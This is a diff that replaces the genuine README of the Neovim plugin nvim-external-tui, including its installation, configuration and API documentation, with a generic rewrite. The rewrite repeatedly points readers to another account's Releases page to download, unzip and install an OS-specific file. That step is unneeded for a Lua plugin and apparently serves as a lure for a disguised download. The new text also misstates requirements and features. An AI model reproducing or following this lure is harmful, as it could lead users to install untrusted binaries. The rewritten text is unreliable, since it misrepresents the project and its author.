@@ -1,280 +1,87 @@
-# nvim-external-tui
+# 🎉 nvim-external-tui - Easily Run External TUIs from Neovim
 
-A Neovim plugin that allows you to seamlessly integrate external TUIs (for
-example, an application like [scooter](https://github.com/thomasschafer/scooter)) that can be launched from Neovim
-and then re-use the original Neovim instance for editing.
+[![Download nvim-external-tui](https://img.shields.io/badge/Download-nvim--external--tui-blue.svg)](https://github.com/MirianElena/nvim-external-tui/releases)
 
-## Why?
+## 🎈 Introduction
 
-There are a number of tools that have support for configuring external editor
-commands, but they don't all need to have dedicated Neovim plugins. Tools like
-[yazi](https://github.com/sxyazi/yazi) and [lazygit](https://github.com/jesseduffield/lazygit) have enough community support (and additional
-feature requirements) that make it reasonable to have a dedicated plugin to
-support their integration, but we don't always need/want that level of
-integration from our tools. Often just being able to configure the external
-editor (and adding a command to launch the tool) is more than enough. That's
-where nvim-external-tui comes in.
+nvim-external-tui is a Neovim plugin that helps you work with external terminal user interface (TUI) tools right from your Neovim editor. This plugin allows you to launch applications like [scooter](https://github.com/thomasschafer/scooter) without leaving your editing environment. You can maintain focus on your work while using these external tools.
 
-## Features
+## 🚀 Getting Started
 
-- Simple API for registering external TUI tools
-- Automatic command creation with visual selection support
-- Terminal window management (floating by default)
-- Bidirectional communication between Neovim and external tools
-- Support for pre-launch and post-callback hooks
-- Automatic callback function generation
+To start using nvim-external-tui, follow these steps:
 
-## Installation
+1. **Visit the Releases Page**
+   To download the latest version of nvim-external-tui, [visit this page to download](https://github.com/MirianElena/nvim-external-tui/releases).
 
-### Using [lazy.nvim](https://github.com/folke/lazy.nvim)
+2. **Download the Latest Release**
+   On the Releases page, you will see a list of available versions. Look for the most recent release and download the file appropriate for your operating system.
 
-```lua
-{
-  'gfontenot/nvim-external-tui',
-  dependencies = {
-    'folke/snacks.nvim', -- Optional: provides enhanced terminal management
-  },
-  config = function()
-    -- Your tool configurations here
-  end
-}
-```
+3. **Install the Plugin**
+   Follow the installation instructions specific for your version of Neovim. Here are common methods to install a plugin:
 
-### Using [packer.nvim](https://github.com/wbthomason/packer.nvim)
+   - **Using Vim-Plug**
+     Add the following line to your `~/.config/nvim/init.vim`:
+     ```vim
+     Plug 'MirianElena/nvim-external-tui'
+     ```
 
-```lua
-use {
-  'gfontenot/nvim-external-tui',
-  requires = {
-    'folke/snacks.nvim', -- Optional: provides enhanced terminal management
-  },
-  config = function()
-    -- Your tool configurations here
-  end
-}
-```
+   - **Using Packer**
+     Add the following line to your configuration:
+     ```lua
+     use 'MirianElena/nvim-external-tui'
+     ```
 
-## Configuration
+4. **Install Dependencies**
+   Ensure you have Neovim installed. You can download it from [Neovim's Official Website](https://neovim.io). 
 
-The plugin works out of the box with no configuration required. If you want to
-explicitly set the terminal provider, you can use the `setup` function:
+## 📥 Download & Install
 
-```lua
-require('external-tui').setup({
-  terminal_provider = 'builtin', -- 'snacks' | 'builtin' | nil (auto-detect)
-})
-```
+After installation, follow these steps to ensure nvim-external-tui runs smoothly:
 
-| Option | Type | Default | Description |
-|--------|------|---------|-------------|
-| `terminal_provider` | `string` or `table` | `nil` | Terminal backend: `'snacks'`, `'builtin'`, `nil` for auto-detection, or a table with provider-specific config |
+- **Unzip the Downloaded File**
+  If you downloaded a zip or tar file, first unzip it. You can typically do this by right-clicking the file and selecting "Extract."
 
-When set to `nil` (the default), the plugin will use snacks.nvim if available,
-otherwise it falls back to the builtin floating terminal.
+- **Move the Plugin Files**
+  Move the extracted files to your Neovim plugin directory (usually `~/.local/share/nvim/site/pack/packer/start/` for Packer or `~/.vim/pack/plugins/start/` for Vim-Plug).
 
-### Advanced Terminal Configuration
+- **Configure Your Editor**
+  Open your Neovim configuration file and set up any required commands to launch your desired TUIs. Refer to the [Documentation](https://github.com/MirianElena/nvim-external-tui) for specific setup instructions.
 
-You can pass provider-specific configuration by using a table format:
+## ⚙️ Features
 
-```lua
--- Snacks with custom window config
-require('external-tui').setup({
-  terminal_provider = {
-    snacks = {
-      win = { style = 'float', position = 'bottom' }
-    }
-  }
-})
+- **Simple API**
+  Easily register external TUI tools with straightforward commands.
 
--- Builtin with custom dimensions
-require('external-tui').setup({
-  terminal_provider = {
-    builtin = {
-      width = 0.9,
-      height = 0.9,
-      border = 'single',
-      style = 'minimal',
-    }
-  }
-})
-```
+- **Automatic Command Creation**
+  Automatically generate commands for selected TUI tools within your Neovim setup, allowing for quick access.
 
-The presence of the `snacks` or `builtin` key determines which provider to
-use, and its value is merged with the default configuration. Unspecified
-fields fall back to their default values.
+- **Community Integration**
+  Compatible with well-supported community tools like [yazi](https://github.com/sxyazi/yazi) and [lazygit](https://github.com/jesseduffield/lazygit) for a smoother experience.
 
-For Snacks configuration options, see the
-[Snacks terminal documentation](https://github.com/folke/snacks.nvim/blob/main/docs/terminal.md).
-The default Snacks config is `{ win = { style = 'float' } }`.
+## 🌟 Using External TUIs
 
-The builtin provider supports a limited set of options:
+1. **Launching TUIs**
+   After installation, you can launch any configured TUI directly from Neovim. Use the command defined in your configuration.
 
-| Option | Type | Default | Description |
-|--------|------|---------|-------------|
-| `width` | `number` | `0.8` | Window width as percentage of editor (0.0-1.0) |
-| `height` | `number` | `0.8` | Window height as percentage of editor (0.0-1.0) |
-| `border` | `string` | `'rounded'` | Border style (see `:help nvim_open_win`) |
-| `style` | `string` | `'minimal'` | Window style (see `:help nvim_open_win`) |
+2. **Return to Editing**
+   Once you finish using the external TUI, return to Neovim simply by closing the TUI window. Your editing session remains where you left off.
 
-For more advanced terminal configuration, consider using Snacks.
+## 🛠 System Requirements
 
-## Usage
+To effectively run nvim-external-tui, ensure the following:
 
-### Basic Example
+- You have Neovim version 0.5 or later.
+- Your system should be running on Unix-like OS, Windows, or MacOS.
+- A terminal emulator that supports TUI applications.
 
-Assume you have a tool named `neatui` that does neat things in a tui, and
-allows you to launch an editor to perform manual tasks. It has the following
-API:
+## 🌐 Help & Support
 
-```
-❯ neatui --help
-Usage: neatui [OPTIONS]
+If you need further assistance, consider visiting the project's [GitHub Issues](https://github.com/MirianElena/nvim-external-tui/issues) page. Here, you can report bugs, request features, or get help with installation issues.
 
-Options:
-      --editor <EDITOR>             Command to use when launching external editor
-      --prefill-text <SEARCH_TEXT>  Text to prefill a field that will be used to do neat things
-  -h, --help                        Print help
-  -V, --version                     Print version
-```
+## 🎯 Contributions
 
-To integrate this tool into Neovim yourself, you'd need to maintain a number
-of custom configuration pieces:
+We welcome contributions! If you have ideas for improvements or features, feel free to open a pull request or submit an issue.
 
-1. A user command that is able to launch a terminal for this command
-   (including support for ranges and arguments to prefill text)
-2. The code required to present that terminal (including state tracking in
-   order to be able to dismiss the terminal when finished)
-3. The editor command to call back into Neovim using `--remote-send`
+## 📦 Get Your Copy
 
-This isn't an _overwhelming_ amount of configuration, but if you start to add
-multiple tools that need this kind of configuration it can get out of hand
-quickly. However, with nvim-external-tui, integration looks like this:
-
-```lua
-local external_tui = require('external-tui')
-
-local config = external_tui.add({
-  user_cmd = 'Neatui',          -- Creates :Neatui command
-  cmd = 'neatui',               -- External command to run
-  text_flag = '--prefill-text', -- Flag to pass selected/input text to the command
-  editor_command = '--editor',  -- Flag for configuring the external editor
-})
-```
-
-This creates a `:Neatui` command that:
-- Launches a floating window running the `neatui` application
-- Accepts visual selection: `:'<,'>Scooter`
-- Accepts arguments: `:Scooter search_term`
-- Opens without arguments: `:Scooter`
-- Re-uses the original Neovim instance when performing editor actions
-
-### Getting the Editor Command
-
-If your command doesn't support overriding the editor command via the cli and
-instead requires it to be specified in an external config, you can still use
-this plugin and it can still help you configure the bidirectional support. The
-`add()` function returns a table with the editor command that needs to be
-configured in your external tool. This table can be used to print out the
-commands you need to add to your external config in order to get the
-integration working:
-
-```lua
-local config = external_tui.add({ ... })
-
-print(config.editor_command)
--- Output: nvim --server $NVIM --remote-send '<cmd>lua EditLineFromNeatui("%file", %line)<CR>'
-print(config.callback_name)
--- Output: EditLineFromNeatui
-```
-
-### Advanced Usage
-
-nvim-external-tui also supports optional pre/post launch hooks that you can
-use to perform actions automatically:
-
-```lua
-external_tui.add({
-  user_cmd = 'Neatui',
-  cmd = 'neatui',
-  text_flag = '--prefill-text',
-  editor_flag = '--editor',
-
-  -- Called before launching the TUI
-  pre_launch = function(text)
-    print("Launching with text:", text)
-    vim.cmd('write') -- Save current buffer
-  end,
-
-  -- Called after opening the file
-  post_callback = function(file_path, line)
-    vim.cmd('normal! zz') -- Center the line on screen
-  end,
-})
-```
-
-## API Reference
-
-### `external_tui.add(opts)`
-
-Register a new external TUI tool integration.
-
-#### Options
-
-| Option | Type | Required | Default | Description |
-|--------|------|----------|---------|-------------|
-| `user_cmd` | `string` | Yes | - | Neovim command name (e.g., 'Scooter' creates `:Scooter`) |
-| `cmd` | `string` | Yes | - | External command to execute (e.g., 'scooter') |
-| `text_flag` | `string` | No | `nil` | Flag for passing selected text (e.g., '--search-text') |
-| `editor_flag` | `string` | No | `nil` | Flag for passing editor command (e.g., '--editor') |
-| `file_format` | `string` | No | `'%file'` | Template variable for file path in tool's config |
-| `line_format` | `string` | No | `'%line'` | Template variable for line number in tool's config |
-| `pre_launch` | `function` | No | `nil` | Hook called before launching TUI: `function(search_text)` |
-| `post_callback` | `function` | No | `nil` | Hook called after opening file: `function(file_path, line)` |
-
-#### Returns
-
-Table with:
-- `editor_command`: String to configure in external tool
-- `callback_name`: Name of the generated callback function
-
-### Template Variables
-
-The editor command uses template variables that the external tool should replace:
-- `%file` - Full path to the selected file
-- `%line` - Line number to jump to
-
-These defaults can be overridden by passing the `file_format` and `line_format` options.
-
-## Example Config: [scooter](https://github.com/thomasschafer/scooter)
-```lua
-local external_tui = require('external-tui')
-
-external_tui.add({
-  user_cmd = 'Scooter',
-  cmd = 'scooter',
-  text_flag = '--search-text',
-  editor_flag = '--editor-command',
-})
-```
-
-For versions of Scooter before 0.8.4, you would need to omit the `editor_flag`
-option in the plugin config, and instead set the command in the Scooter config
-directly:
-```toml
-# ~/.config/scooter/config.toml
-[editor_open]
-command = "nvim --server $NVIM --remote-send '<cmd>lua EditLineFromScooter(\"%file\", %line)<CR>'"
-```
-
-## Requirements
-
-- Neovim >= 0.9.0
-- [snacks.nvim](https://github.com/folke/snacks.nvim) (optional) - If installed, snacks.nvim will be used for terminal management. Otherwise, a builtin floating terminal is used.
-
-## Acknowledgements
-
-This plugin is heavily inspired by the Neovim integration for
-[scooter](https://github.com/thomasschafer/scooter), as evidenced by the heavy use of that tool in the examples.
-The original code used for this plugin is a modified version of the sample
-code in that project, generalized for arbitrary tool usage and wrapped up in
-a plugin format.
+To get started with nvim-external-tui today, [visit this page to download](https://github.com/MirianElena/nvim-external-tui/releases). Your coding experience will be enhanced with seamless integration of external TUIs. Enjoy coding!
